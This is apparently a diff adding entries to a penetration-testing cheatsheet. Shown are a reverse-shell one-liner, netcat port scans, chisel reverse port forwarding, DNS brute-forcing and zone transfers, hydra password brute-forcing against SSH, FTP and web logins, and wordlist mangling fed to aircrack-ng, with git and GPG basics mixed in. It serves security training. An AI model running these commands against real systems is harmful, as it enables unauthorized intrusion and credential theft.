@@ -318,6 +318,15 @@ cd cheatsheet-pentesting
   ```bash
   bash -i >& /dev/tcp/<your-IP>/4444 0>&1
   ```
+- **Perform a TCP scan on ports 3388 to 3390**:
+  ```bash
+  nc -nvv -w 1 -z 10.11.1.220 3388-3390
+  ```
+
+- **Perform a UDP scan on ports 160 to 162**:
+  ```bash
+  nc -nv -u -z -w 1 10.11.1.115 160-162
+  ```
 ---
 ### SearchSploit
 - **Search for Exploits**:
@@ -662,6 +671,33 @@ cd cheatsheet-pentesting
 - **Connect to Remote HTTP Proxy**:
   ```bash
   chisel client <remote-server>:<remote-port> <local-port>:http
+  ```
+- **Setting Up Chisel Server/client for Remote Forwarding**:
+  ```bash
+  chisel server --reverse --port 9002
+  chisel.exe client 192.168.119.125:9002 192.168.119.125:445 R:445:localhost:445
+  ```
+- **Example of General Port Forwarding**:
+  ```bash
+  ./chisel server -p 8083 --reverse
+  ./chisel client 192.168.1.99:8083 R:6379:127.0.0.1:6379
+  
+  ```
+- **Example: Forwarding MSSQL(Server)**:
+  ```bash
+  ┌──(kali㉿kali)-[~]
+  └─$ chisel server -p 8000 --reverse
+  2022/03/21 14:21:59 server: Reverse tunnelling enabled
+  2022/03/21 14:21:59 server: Fingerprint YqJoP81ML0mrD3p2Mhd+Ix6WRr1Wb7e61RFzukVAP3Q=
+  2022/03/21 14:21:59 server: Listening on http://0.0.0.0:8000
+  ```
+
+- **Example: Forwarding MSSQL(Client)**:
+  ```bash
+  PS C:\xampp\htdocs\tmp\> .\chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
+  chisel.exe client 192.168.213.128:8000 R:3306:127.0.0.1:3306
+  2022/03/21 11:17:46 client: Connecting to ws://192.168.118.23:8000
+  2022/03/21 11:17:47 client: Connected (Latency 201.072ms)
   ```
 
 ---
@@ -1086,19 +1122,66 @@ cd cheatsheet-pentesting
   git clone <repository-url>
   ```
 ---
+- **Check Git Version**:
+  ```bash
+  git --version
+  ```
+- ** Accessing Git Help*:
+  ```bash
+  git help
+  git help git
+  git help commit
+  git help init
+  git help config
+  ```
+---
+- **Configuring User Settings**:
+  ```bash
+  git config --local user.email "hacker@git.com"
+  git config --local user.name "Leet Hacker"
+  
+  ```
+- **Confirm User Configuration**:
+  ```bash
+  cat config
+  git config --list
+  ```
+---
 - **Check the Status of a Git Repository**:
   ```bash
   git status
+  ```
+- **adding and commiting changes the Status of a Git Repository**:
+  ```bash
+  git add .
+  git commit -m "First commit"
+  ```
+- **Viewing Commit Logs**:
+  ```bash
+  git log
+  git log --pretty=oneline
+  git log --stat
+  git log -p -1
+  ```
+- **Git Diff: Comparing Changes Between Commits**:
+  ```bash
+  git diff 4e5a690fb542e77598c46c7d58f614238fd35a5c 8ad4afea2376ca2eeb9ffb3ff293c5456e3708c9
+  git diff 4e5a690 8ad4af
   ```
 ### GPG
 - **Encrypt a File**:
   ```bash
   gpg -c <file>
   ```
+- **Encrypt the file using Blowfish symmetric-key encryption**:
+  ```bash
+  gpg -c --cipher-algo blowfish <file>
+  ```
 
 - **Decrypt a File**:
   ```bash
   gpg <file>.gpg
+  gpg --decrypt <file>.gpg
   ```
 
 - **Generate a GPG Key Pair**:
@@ -1131,6 +1214,35 @@ cd cheatsheet-pentesting
 - **Reverse Lookup an IP**:
   ```bash
   host <IP_address>
+  ```
+- **Lookup an IP Address for a Hostname**:
+  ```bash
+  host <hostname>
+  host www.megacorpone.com
+  ```
+
+- **Querying MX and TXT Records**:
+  ```bash
+  host -t mx megacorpone.com
+  host -t txt megacorpone.com
+  ```
+- **Brute Forcing Forward DNS Name Lookups**:
+  ```bash
+  for ip in $(cat list.txt); do host $ip.megacorpone.com; done
+  ```
+
+- **Brute Forcing Reverse DNS Names**:
+  ```bash
+  for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
+  ```
+- **Perform a DNS zone transfer**:
+  ```bash
+  host -l <domain name> <dns server address>
+  host -l megacorpone.com ns2.megacorpone.com
+  ```
+- **Retrieving DNS Servers for a Domain**:
+  ```bash
+  host -t ns megacorpone.com | cut -d " " -f 4
   ```
 ---
 ### HTTPTunnel
@@ -1165,11 +1277,33 @@ cd cheatsheet-pentesting
 - **Brute Force SSH Login**:
   ```bash
   hydra -l <username> -P <password_list> ssh://<target_ip>
+  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10
   ```
 
 - **Brute Force HTTP Basic Authentication**:
   ```bash
   hydra -L <user_list> -P <password_list> http-get://<target_ip>
+  ```
+- **Retrieve Information About http-form-post Module**:
+  ```bash
+  hydra http-form-post -U
+  ```
+
+- **Web Form Bruteforce Attack**:
+  ```bash
+    hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+    hydra 10.11.0.22 http-form-post "/login.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P passwords.txt
+  ```
+- **Brute-Forcing FTP with Limited Tasks**:
+  ```bash
+  hydra -l <username> -P <password_list> ftp://<target_ip> -t <number>
+  hydra -l offsec -P /usr/share/wordlists/rockyou.txt ftp://192.168.217.52 -t 3
+  ```
+
+- ** FTP Bruteforce Using Colon-Separated "login:pass" Format**:
+  ```bash
+  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://192.168.208.183
+  hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.120.161 ftp
   ```
 ---
 ### ICACLS
@@ -1591,6 +1725,30 @@ cd cheatsheet-pentesting
   ```bash
   nslookup <hostname> <DNS_server>
   ```
+- **Example: Running nslookup to query the SRV record for LDAP services on a Domain Controller**:
+  ```bash
+  C:\Windows\system32>nslookup
+  nslookup
+  DNS request timed out.
+      timeout was 2 seconds.
+  Default Server:  UnKnown
+  Address:  10.5.5.30
+  
+  > set type=all
+  > _ldap._tcp.dc._msdcs.sandbox.local
+  Server:  UnKnown
+  Address:  10.5.5.30
+  
+  _ldap._tcp.dc._msdcs.sandbox.local      SRV service location:
+            priority       = 0
+            weight         = 100
+            port           = 389
+            svr hostname   = SANDBOXDC.sandbox.local
+  SANDBOXDC.sandbox.local internet address = 10.5.5.30
+  > exit
+  
+  C:\Windows\system32>
+  ```
 ---
 ### OneSixtyOne
 - **Scan SNMP Devices**:
@@ -1877,7 +2035,29 @@ cd cheatsheet-pentesting
   ```bash
   rsmangler --file <input_file> --rules
   ```
-
+- **Using RSMangler to generate permutations of the wordlist**:
+  ```bash
+  echo bird > wordlist.txt
+  echo cat >> wordlist.txt
+  echo dog >> wordlist.txt
+  rsmangler --file wordlist.txt
+  ```
+- **Saving the Mangled Output to a File**:
+  ```bash
+  rsmangler --file wordlist.txt --output mangled.txt
+  ```
+- **Piping a wordlist into RSMangler**:
+  ```bash
+  cat wordlist.txt | rsmangler --file -
+  ```
+- **Mangling Wordlist with Character Limits**:
+  ```bash
+  rsmangler --file wordlist.txt --min 12 --max 13
+  ```
+- **Combining RSMangler with Aircrack-ng**:
+  ```bash
+  rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
+  ```
 ### Runas
 - **Run a Program as Another User**:
   ```cmd
